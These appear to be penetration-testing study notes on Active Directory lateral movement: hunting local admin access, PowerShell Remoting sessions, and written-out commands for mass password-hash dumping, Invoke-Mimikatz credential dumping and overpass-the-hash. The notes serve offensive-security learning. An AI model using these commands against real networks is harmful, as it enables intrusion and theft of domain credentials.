After Privilege Escalation

- hunt for local admin access on other machines(load powerview -> Find-LocalAdminAccess)
- hunt for high privilege domain accounts(Domain Admin)



### Powershell Remoting

enabled by default on server 2012 onwards

need to be enabled by admin privs on windows desktop machine

port 5985

#### PSSession

##### One-to-One

- interactive
- run in new process
- stateful
- cmdlets
  - New-PSSession
    - `$sess = New-PSSession -ComputerName <computername>`
  - Enter-PSSession
    - `Enter-PSSession -ComputerName <computername>/-Session <session>`

##### One-to-Many

- execute commands on multiple remote computers
- `-Credential` to pass username/password
  - `Invoke-Command -ScriptBlock {Get-Process} -Computername (Get-Content <server list>)`
  - `Invoke-Command -FilePath C:\Get-PassHashes.ps1 -ComputerName (Get-Content <server list>)`(restricted by ConstrainedLanguage mode )
  - `Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName (Get-Content <server list>)` (execute locally loaded function o n the remote machines, functions get converted to scriptblock and send to the remote machines, still restricted by ConstrainedLanguage mode)

### Mimikatz

#####  Dump credentials on local machines/remote machines

- `Invoke-Mimikatz -DumpCreds [-Computer @("computer1","computer2")]`

##### Over pass the hash

`Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:domainname /ntlm:<ntlmhash> /run:powershell.exe"'`